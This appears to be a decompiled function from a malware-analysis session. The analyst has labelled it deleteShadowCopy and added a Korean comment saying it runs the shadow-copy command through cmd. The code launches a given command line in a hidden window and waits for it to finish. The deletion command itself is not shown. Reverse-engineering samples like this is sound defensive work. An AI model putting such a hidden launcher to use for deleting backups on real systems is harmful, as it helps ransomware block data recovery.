// --- Metadata ---
// Function Name: deleteShadowCopy_401A90
// Address: 0x401A90
// Exported At: 20250526_171641
// Signature: unknown_signature
// ---------------
int __cdecl deleteShadowCopy_401A90(LPSTR lpCommandLine, DWORD dwMilliseconds, LPDWORD lpExitCode)
{
  struct _PROCESS_INFORMATION ProcessInformation; // [esp+8h] [ebp-54h] BYREF
  struct _STARTUPINFOA StartupInfo; // [esp+18h] [ebp-44h] BYREF

  StartupInfo.cb = 68;                          // cmd로 섀도우 카피 명령어를 실행 
  memset(&StartupInfo.lpReserved, 0, 0x40u);
  ProcessInformation.hThread = 0;
  ProcessInformation.dwProcessId = 0;
  ProcessInformation.dwThreadId = 0;
  ProcessInformation.hProcess = 0;
  StartupInfo.dwFlags = 1;
  StartupInfo.wShowWindow = 0;
  if ( !CreateProcessA(0, lpCommandLine, 0, 0, 0, 0x8000000u, 0, 0, &StartupInfo, &ProcessInformation) )
    return 0;
  if ( dwMilliseconds )
  {
    if ( WaitForSingleObject(ProcessInformation.hProcess, dwMilliseconds) )
      TerminateProcess(ProcessInformation.hProcess, 0xFFFFFFFF);
    if ( lpExitCode )
      GetExitCodeProcess(ProcessInformation.hProcess, lpExitCode);
  }
  CloseHandle(ProcessInformation.hProcess);
  CloseHandle(ProcessInformation.hThread);
  return 1;
}
